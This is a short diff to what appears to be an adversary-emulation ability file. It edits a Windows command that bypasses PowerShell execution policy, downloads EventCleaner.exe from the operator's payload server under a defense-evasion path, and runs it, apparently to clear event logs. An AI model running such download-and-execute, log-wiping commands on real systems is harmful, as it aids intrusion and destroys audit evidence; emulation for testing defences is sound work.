@@ -15,6 +15,5 @@ technique:
 platforms:
   windows:
     cmd:
-      command: powershell.exe -exec bypass -C "(New-Object Net.WebClient).DownloadFile('#{operator.payloads}/defense-evasion/generic/EventCleaner.exe','EventCleaner.exe')";.\EventCleaner.exe
+      command: powershell.exe -exec bypass -C "(New-Object Net.WebClient).DownloadFile('#{operator.payloads}/62824d85ea5e6d79386712e5ecf35aaf7868ecfa/EventCleaner.exe','EventCleaner.exe')";.\EventCleaner.exe
         suspend
-
